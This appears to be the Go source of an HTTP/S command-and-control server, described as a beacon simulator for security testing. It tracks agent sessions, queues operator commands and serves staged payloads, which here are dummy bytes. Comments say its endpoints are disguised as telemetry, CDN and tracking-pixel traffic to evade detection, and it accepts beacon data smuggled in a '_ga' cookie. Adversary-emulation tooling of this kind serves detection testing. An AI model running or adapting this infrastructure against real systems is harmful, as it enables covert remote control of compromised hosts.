// Mirqab Cloud Relay - HTTP/S C2 Simulator
// Simulates HTTP-based Command & Control beacon traffic for security testing
package main

import (
	"context"
	"crypto/rand"
	"crypto/tls"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"math/big"
	"net/http"
	"os"
	"os/signal"
	"sync"
	"syscall"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
	"github.com/prometheus/client_golang/prometheus"
	"github.com/prometheus/client_golang/prometheus/promhttp"
	"github.com/rs/zerolog"
	"github.com/rs/zerolog/log"
)

// -----------------------------------------------------------------------------
// Configuration
// -----------------------------------------------------------------------------

type Config struct {
	ServerPort       int           `json:"server_port"`
	MetricsPort      int           `json:"metrics_port"`
	TLSEnabled       bool          `json:"tls_enabled"`
	TLSCertPath      string        `json:"tls_cert_path"`
	TLSKeyPath       string        `json:"tls_key_path"`
	TenantID         string        `json:"tenant_id"`
	BeaconInterval   time.Duration `json:"beacon_interval"`
	JitterPercent    int           `json:"jitter_percent"`
	MaxSessions      int           `json:"max_sessions"`
	SessionTimeout   time.Duration `json:"session_timeout"`
	EnableLogging    bool          `json:"enable_logging"`
	RedisURL         string        `json:"redis_url"`
	DomainFronting   bool          `json:"domain_fronting"`
	AllowedOrigins   []string      `json:"allowed_origins"`
}

func defaultConfig() *Config {
	return &Config{
		ServerPort:       8443,
		MetricsPort:      9090,
		TLSEnabled:       true,
		TLSCertPath:      "/etc/ssl/certs/server.crt",
		TLSKeyPath:       "/etc/ssl/private/server.key",
		TenantID:         os.Getenv("TENANT_ID"),
		BeaconInterval:   60 * time.Second,
		JitterPercent:    20,
		MaxSessions:      1000,
		SessionTimeout:   30 * time.Minute,
		EnableLogging:    true,
		RedisURL:         os.Getenv("REDIS_URL"),
		DomainFronting:   false,
		AllowedOrigins:   []string{"*"},
	}
}

// -----------------------------------------------------------------------------
// Data Models
// -----------------------------------------------------------------------------

// BeaconSession represents an active C2 session
type BeaconSession struct {
	ID            string            `json:"id"`
	TenantID      string            `json:"tenant_id"`
	AgentID       string            `json:"agent_id"`
	ExternalIP    string            `json:"external_ip"`
	UserAgent     string            `json:"user_agent"`
	Hostname      string            `json:"hostname"`
	Username      string            `json:"username"`
	OS            string            `json:"os"`
	Architecture  string            `json:"architecture"`
	ProcessID     int               `json:"process_id"`
	Integrity     string            `json:"integrity"`
	FirstSeen     time.Time         `json:"first_seen"`
	LastSeen      time.Time         `json:"last_seen"`
	BeaconCount   int64             `json:"beacon_count"`
	BytesSent     int64             `json:"bytes_sent"`
	BytesReceived int64             `json:"bytes_received"`
	Status        string            `json:"status"`
	Metadata      map[string]string `json:"metadata"`
	mu            sync.RWMutex
}

// BeaconRequest represents an incoming beacon from an agent
type BeaconRequest struct {
	SessionID string            `json:"session_id,omitempty"`
	AgentID   string            `json:"agent_id"`
	Hostname  string            `json:"hostname"`
	Username  string            `json:"username"`
	OS        string            `json:"os"`
	Arch      string            `json:"arch"`
	PID       int               `json:"pid"`
	Integrity string            `json:"integrity"`
	Data      string            `json:"data,omitempty"`
	Metadata  map[string]string `json:"metadata,omitempty"`
}

// BeaconResponse represents the C2 server response
type BeaconResponse struct {
	SessionID      string   `json:"session_id"`
	Status         string   `json:"status"`
	NextBeacon     int      `json:"next_beacon"`
	Commands       []string `json:"commands,omitempty"`
	PayloadURL     string   `json:"payload_url,omitempty"`
	EncodedPayload string   `json:"encoded_payload,omitempty"`
}

// TaskQueue holds pending commands for sessions
type TaskQueue struct {
	SessionID string   `json:"session_id"`
	Commands  []string `json:"commands"`
}

// -----------------------------------------------------------------------------
// Session Manager
// -----------------------------------------------------------------------------

type SessionManager struct {
	sessions map[string]*BeaconSession
	tasks    map[string]*TaskQueue
	config   *Config
	mu       sync.RWMutex
}

func NewSessionManager(config *Config) *SessionManager {
	sm := &SessionManager{
		sessions: make(map[string]*BeaconSession),
		tasks:    make(map[string]*TaskQueue),
		config:   config,
	}

	// Start cleanup goroutine
	go sm.cleanupExpiredSessions()

	return sm
}

func (sm *SessionManager) CreateSession(req *BeaconRequest, remoteIP string, userAgent string) *BeaconSession {
	sm.mu.Lock()
	defer sm.mu.Unlock()

	sessionID := uuid.New().String()
	now := time.Now()

	session := &BeaconSession{
		ID:           sessionID,
		TenantID:     sm.config.TenantID,
		AgentID:      req.AgentID,
		ExternalIP:   remoteIP,
		UserAgent:    userAgent,
		Hostname:     req.Hostname,
		Username:     req.Username,
		OS:           req.OS,
		Architecture: req.Arch,
		ProcessID:    req.PID,
		Integrity:    req.Integrity,
		FirstSeen:    now,
		LastSeen:     now,
		BeaconCount:  1,
		Status:       "active",
		Metadata:     req.Metadata,
	}

	sm.sessions[sessionID] = session
	sessionsActive.Inc()

	log.Info().
		Str("session_id", sessionID).
		Str("agent_id", req.AgentID).
		Str("hostname", req.Hostname).
		Str("remote_ip", remoteIP).
		Msg("New beacon session established")

	return session
}

func (sm *SessionManager) GetSession(sessionID string) (*BeaconSession, bool) {
	sm.mu.RLock()
	defer sm.mu.RUnlock()

	session, exists := sm.sessions[sessionID]
	return session, exists
}

func (sm *SessionManager) UpdateSession(sessionID string, bytesReceived int64) (*BeaconSession, bool) {
	sm.mu.Lock()
	defer sm.mu.Unlock()

	session, exists := sm.sessions[sessionID]
	if !exists {
		return nil, false
	}

	session.mu.Lock()
	session.LastSeen = time.Now()
	session.BeaconCount++
	session.BytesReceived += bytesReceived
	session.mu.Unlock()

	beaconsReceived.Inc()

	return session, true
}

func (sm *SessionManager) GetSessions() []*BeaconSession {
	sm.mu.RLock()
	defer sm.mu.RUnlock()

	sessions := make([]*BeaconSession, 0, len(sm.sessions))
	for _, s := range sm.sessions {
		sessions = append(sessions, s)
	}
	return sessions
}

func (sm *SessionManager) QueueTask(sessionID string, command string) {
	sm.mu.Lock()
	defer sm.mu.Unlock()

	if _, exists := sm.tasks[sessionID]; !exists {
		sm.tasks[sessionID] = &TaskQueue{
			SessionID: sessionID,
			Commands:  []string{},
		}
	}
	sm.tasks[sessionID].Commands = append(sm.tasks[sessionID].Commands, command)
}

func (sm *SessionManager) GetPendingTasks(sessionID string) []string {
	sm.mu.Lock()
	defer sm.mu.Unlock()

	if queue, exists := sm.tasks[sessionID]; exists {
		commands := queue.Commands
		queue.Commands = []string{} // Clear after retrieval
		return commands
	}
	return nil
}

func (sm *SessionManager) cleanupExpiredSessions() {
	ticker := time.NewTicker(1 * time.Minute)
	defer ticker.Stop()

	for range ticker.C {
		sm.mu.Lock()
		now := time.Now()
		for id, session := range sm.sessions {
			if now.Sub(session.LastSeen) > sm.config.SessionTimeout {
				delete(sm.sessions, id)
				delete(sm.tasks, id)
				sessionsActive.Dec()
				log.Info().
					Str("session_id", id).
					Msg("Session expired and cleaned up")
			}
		}
		sm.mu.Unlock()
	}
}

// -----------------------------------------------------------------------------
// Prometheus Metrics
// -----------------------------------------------------------------------------

var (
	beaconsReceived = prometheus.NewCounter(prometheus.CounterOpts{
		Name: "c2_http_beacons_received_total",
		Help: "Total number of beacons received",
	})

	sessionsActive = prometheus.NewGauge(prometheus.GaugeOpts{
		Name: "c2_http_sessions_active",
		Help: "Number of active beacon sessions",
	})

	beaconLatency = prometheus.NewHistogram(prometheus.HistogramOpts{
		Name:    "c2_http_beacon_latency_seconds",
		Help:    "Beacon processing latency",
		Buckets: prometheus.DefBuckets,
	})

	bytesTransferred = prometheus.NewCounterVec(prometheus.CounterOpts{
		Name: "c2_http_bytes_transferred_total",
		Help: "Total bytes transferred",
	}, []string{"direction"})

	errorCount = prometheus.NewCounterVec(prometheus.CounterOpts{
		Name: "c2_http_errors_total",
		Help: "Total number of errors",
	}, []string{"type"})
)

func init() {
	prometheus.MustRegister(beaconsReceived)
	prometheus.MustRegister(sessionsActive)
	prometheus.MustRegister(beaconLatency)
	prometheus.MustRegister(bytesTransferred)
	prometheus.MustRegister(errorCount)
}

// -----------------------------------------------------------------------------
// HTTP Handlers
// -----------------------------------------------------------------------------

type C2Server struct {
	config   *Config
	sessions *SessionManager
	router   *gin.Engine
}

func NewC2Server(config *Config) *C2Server {
	gin.SetMode(gin.ReleaseMode)

	server := &C2Server{
		config:   config,
		sessions: NewSessionManager(config),
		router:   gin.New(),
	}

	server.setupRoutes()
	return server
}

func (s *C2Server) setupRoutes() {
	// Middleware
	s.router.Use(gin.Recovery())
	s.router.Use(s.loggingMiddleware())
	s.router.Use(s.tenantMiddleware())

	// C2 beacon endpoints - designed to look like legitimate traffic
	// These URLs are intentionally generic to evade detection
	s.router.POST("/api/v1/update", s.handleBeacon)
	s.router.POST("/api/v1/telemetry", s.handleBeacon)
	s.router.POST("/cdn/analytics", s.handleBeacon)
	s.router.POST("/static/beacon.gif", s.handleBeaconGET)
	s.router.GET("/static/pixel.png", s.handleBeaconGET)

	// Staging endpoints for payloads
	s.router.GET("/downloads/:file", s.handlePayloadDownload)
	s.router.GET("/assets/:file", s.handlePayloadDownload)

	// Admin/management endpoints (internal only)
	admin := s.router.Group("/admin")
	admin.Use(s.adminAuthMiddleware())
	{
		admin.GET("/sessions", s.handleListSessions)
		admin.GET("/sessions/:id", s.handleGetSession)
		admin.POST("/sessions/:id/task", s.handleQueueTask)
		admin.DELETE("/sessions/:id", s.handleKillSession)
	}

	// Health check
	s.router.GET("/health", s.handleHealth)
	s.router.GET("/ready", s.handleReady)
}

func (s *C2Server) loggingMiddleware() gin.HandlerFunc {
	return func(c *gin.Context) {
		start := time.Now()
		path := c.Request.URL.Path

		c.Next()

		latency := time.Since(start)
		beaconLatency.Observe(latency.Seconds())

		if s.config.EnableLogging {
			log.Debug().
				Str("method", c.Request.Method).
				Str("path", path).
				Int("status", c.Writer.Status()).
				Dur("latency", latency).
				Str("client_ip", c.ClientIP()).
				Msg("Request processed")
		}
	}
}

func (s *C2Server) tenantMiddleware() gin.HandlerFunc {
	return func(c *gin.Context) {
		// Add tenant context
		c.Set("tenant_id", s.config.TenantID)
		c.Next()
	}
}

func (s *C2Server) adminAuthMiddleware() gin.HandlerFunc {
	return func(c *gin.Context) {
		// Check for admin token
		token := c.GetHeader("X-Admin-Token")
		expectedToken := os.Getenv("ADMIN_TOKEN")

		if token == "" || token != expectedToken {
			c.JSON(http.StatusUnauthorized, gin.H{"error": "unauthorized"})
			c.Abort()
			return
		}
		c.Next()
	}
}

// handleBeacon processes incoming C2 beacon traffic
func (s *C2Server) handleBeacon(c *gin.Context) {
	var req BeaconRequest

	// Try to parse JSON body
	if err := c.ShouldBindJSON(&req); err != nil {
		// Try base64 encoded body
		body, _ := c.GetRawData()
		if decoded, err := base64.StdEncoding.DecodeString(string(body)); err == nil {
			json.Unmarshal(decoded, &req)
		}
	}

	if req.AgentID == "" {
		errorCount.WithLabelValues("invalid_request").Inc()
		// Return benign response to avoid detection
		c.JSON(http.StatusOK, gin.H{"status": "ok"})
		return
	}

	bytesTransferred.WithLabelValues("received").Add(float64(c.Request.ContentLength))

	var session *BeaconSession
	var response BeaconResponse

	if req.SessionID != "" {
		// Existing session
		existingSession, exists := s.sessions.UpdateSession(req.SessionID, c.Request.ContentLength)
		if !exists {
			// Session expired, create new one
			session = s.sessions.CreateSession(&req, c.ClientIP(), c.Request.UserAgent())
		} else {
			session = existingSession
		}
	} else {
		// New session
		session = s.sessions.CreateSession(&req, c.ClientIP(), c.Request.UserAgent())
	}

	// Calculate next beacon interval with jitter
	interval := s.calculateBeaconInterval()

	// Get pending commands
	commands := s.sessions.GetPendingTasks(session.ID)

	response = BeaconResponse{
		SessionID:  session.ID,
		Status:     "active",
		NextBeacon: int(interval.Seconds()),
		Commands:   commands,
	}

	// Simulate payload staging if requested
	if len(commands) > 0 {
		response.PayloadURL = fmt.Sprintf("/downloads/%s.bin", generateRandomHex(8))
	}

	c.JSON(http.StatusOK, response)
}

// handleBeaconGET handles GET-based beacon requests (for stealth)
func (s *C2Server) handleBeaconGET(c *gin.Context) {
	// Extract encoded data from query params or cookies
	data := c.Query("d")
	if data == "" {
		data, _ = c.Cookie("_ga")
	}

	if data == "" {
		// Return a 1x1 transparent GIF
		gif := []byte{
			0x47, 0x49, 0x46, 0x38, 0x39, 0x61, 0x01, 0x00,
			0x01, 0x00, 0x80, 0x00, 0x00, 0xff, 0xff, 0xff,
			0x00, 0x00, 0x00, 0x21, 0xf9, 0x04, 0x01, 0x00,
			0x00, 0x00, 0x00, 0x2c, 0x00, 0x00, 0x00, 0x00,
			0x01, 0x00, 0x01, 0x00, 0x00, 0x02, 0x02, 0x44,
			0x01, 0x00, 0x3b,
		}
		c.Data(http.StatusOK, "image/gif", gif)
		return
	}

	// Decode and process beacon
	decoded, err := base64.URLEncoding.DecodeString(data)
	if err != nil {
		c.Data(http.StatusOK, "image/gif", []byte{})
		return
	}

	var req BeaconRequest
	if err := json.Unmarshal(decoded, &req); err != nil {
		c.Data(http.StatusOK, "image/gif", []byte{})
		return
	}

	beaconsReceived.Inc()

	// Process beacon silently
	if req.SessionID != "" {
		s.sessions.UpdateSession(req.SessionID, int64(len(data)))
	} else if req.AgentID != "" {
		s.sessions.CreateSession(&req, c.ClientIP(), c.Request.UserAgent())
	}

	// Return pixel
	c.Data(http.StatusOK, "image/gif", []byte{})
}

// handlePayloadDownload serves staged payloads
func (s *C2Server) handlePayloadDownload(c *gin.Context) {
	file := c.Param("file")

	// Generate dummy payload for simulation
	// In production, this would serve actual test payloads
	payload := generateDummyPayload(file)

	bytesTransferred.WithLabelValues("sent").Add(float64(len(payload)))

	c.Header("Content-Disposition", fmt.Sprintf("attachment; filename=%s", file))
	c.Data(http.StatusOK, "application/octet-stream", payload)
}

// handleListSessions returns all active sessions
func (s *C2Server) handleListSessions(c *gin.Context) {
	sessions := s.sessions.GetSessions()
	c.JSON(http.StatusOK, gin.H{
		"tenant_id": s.config.TenantID,
		"count":     len(sessions),
		"sessions":  sessions,
	})
}

// handleGetSession returns details for a specific session
func (s *C2Server) handleGetSession(c *gin.Context) {
	sessionID := c.Param("id")

	session, exists := s.sessions.GetSession(sessionID)
	if !exists {
		c.JSON(http.StatusNotFound, gin.H{"error": "session not found"})
		return
	}

	c.JSON(http.StatusOK, session)
}

// handleQueueTask queues a command for a session
func (s *C2Server) handleQueueTask(c *gin.Context) {
	sessionID := c.Param("id")

	var task struct {
		Command string `json:"command"`
	}

	if err := c.ShouldBindJSON(&task); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid request"})
		return
	}

	_, exists := s.sessions.GetSession(sessionID)
	if !exists {
		c.JSON(http.StatusNotFound, gin.H{"error": "session not found"})
		return
	}

	s.sessions.QueueTask(sessionID, task.Command)

	c.JSON(http.StatusOK, gin.H{"status": "queued"})
}

// handleKillSession terminates a session
func (s *C2Server) handleKillSession(c *gin.Context) {
	sessionID := c.Param("id")

	s.sessions.mu.Lock()
	defer s.sessions.mu.Unlock()

	if _, exists := s.sessions.sessions[sessionID]; !exists {
		c.JSON(http.StatusNotFound, gin.H{"error": "session not found"})
		return
	}

	delete(s.sessions.sessions, sessionID)
	delete(s.sessions.tasks, sessionID)
	sessionsActive.Dec()

	c.JSON(http.StatusOK, gin.H{"status": "terminated"})
}

func (s *C2Server) handleHealth(c *gin.Context) {
	c.JSON(http.StatusOK, gin.H{
		"status":    "healthy",
		"tenant_id": s.config.TenantID,
		"timestamp": time.Now().UTC(),
	})
}

func (s *C2Server) handleReady(c *gin.Context) {
	c.JSON(http.StatusOK, gin.H{"ready": true})
}

// -----------------------------------------------------------------------------
// Helper Functions
// -----------------------------------------------------------------------------

func (s *C2Server) calculateBeaconInterval() time.Duration {
	base := s.config.BeaconInterval

	// Add jitter
	if s.config.JitterPercent > 0 {
		jitterRange := int64(base) * int64(s.config.JitterPercent) / 100
		jitter, _ := rand.Int(rand.Reader, big.NewInt(jitterRange*2))
		base = base + time.Duration(jitter.Int64()-jitterRange)
	}

	return base
}

func generateRandomHex(length int) string {
	bytes := make([]byte, length/2)
	rand.Read(bytes)
	return hex.EncodeToString(bytes)
}

func generateDummyPayload(filename string) []byte {
	// Generate a benign test payload
	// This is just random data for simulation purposes
	size := 4096
	payload := make([]byte, size)
	rand.Read(payload)

	// Add a recognizable header for testing
	copy(payload[:16], []byte("MIRQAB_TEST_FILE"))

	return payload
}

// -----------------------------------------------------------------------------
// Server Lifecycle
// -----------------------------------------------------------------------------

func (s *C2Server) Run() error {
	// Start metrics server
	go func() {
		metricsServer := &http.Server{
			Addr:    fmt.Sprintf(":%d", s.config.MetricsPort),
			Handler: promhttp.Handler(),
		}
		log.Info().Int("port", s.config.MetricsPort).Msg("Starting metrics server")
		if err := metricsServer.ListenAndServe(); err != http.ErrServerClosed {
			log.Error().Err(err).Msg("Metrics server error")
		}
	}()

	// Main server
	server := &http.Server{
		Addr:         fmt.Sprintf(":%d", s.config.ServerPort),
		Handler:      s.router,
		ReadTimeout:  30 * time.Second,
		WriteTimeout: 30 * time.Second,
		IdleTimeout:  120 * time.Second,
	}

	// Graceful shutdown
	go func() {
		sigChan := make(chan os.Signal, 1)
		signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
		<-sigChan

		log.Info().Msg("Shutting down server...")

		ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
		defer cancel()

		if err := server.Shutdown(ctx); err != nil {
			log.Error().Err(err).Msg("Server shutdown error")
		}
	}()

	log.Info().
		Int("port", s.config.ServerPort).
		Bool("tls", s.config.TLSEnabled).
		Str("tenant_id", s.config.TenantID).
		Msg("Starting C2 HTTP simulator")

	if s.config.TLSEnabled {
		tlsConfig := &tls.Config{
			MinVersion: tls.VersionTLS12,
			CipherSuites: []uint16{
				tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
				tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
				tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			},
		}
		server.TLSConfig = tlsConfig
		return server.ListenAndServeTLS(s.config.TLSCertPath, s.config.TLSKeyPath)
	}

	return server.ListenAndServe()
}

// -----------------------------------------------------------------------------
// Main
// -----------------------------------------------------------------------------

func main() {
	// Setup logging
	zerolog.TimeFieldFormat = zerolog.TimeFormatUnix
	log.Logger = log.Output(zerolog.ConsoleWriter{Out: os.Stderr, TimeFormat: time.RFC3339})

	// Load configuration
	config := defaultConfig()

	// Override from environment
	if port := os.Getenv("SERVER_PORT"); port != "" {
		fmt.Sscanf(port, "%d", &config.ServerPort)
	}
	if interval := os.Getenv("BEACON_INTERVAL"); interval != "" {
		if d, err := time.ParseDuration(interval); err == nil {
			config.BeaconInterval = d
		}
	}
	if jitter := os.Getenv("JITTER_PERCENT"); jitter != "" {
		fmt.Sscanf(jitter, "%d", &config.JitterPercent)
	}
	if os.Getenv("TLS_ENABLED") == "false" {
		config.TLSEnabled = false
	}

	// Create and run server
	server := NewC2Server(config)
	if err := server.Run(); err != nil && err != http.ErrServerClosed {
		log.Fatal().Err(err).Msg("Server failed")
	}
}
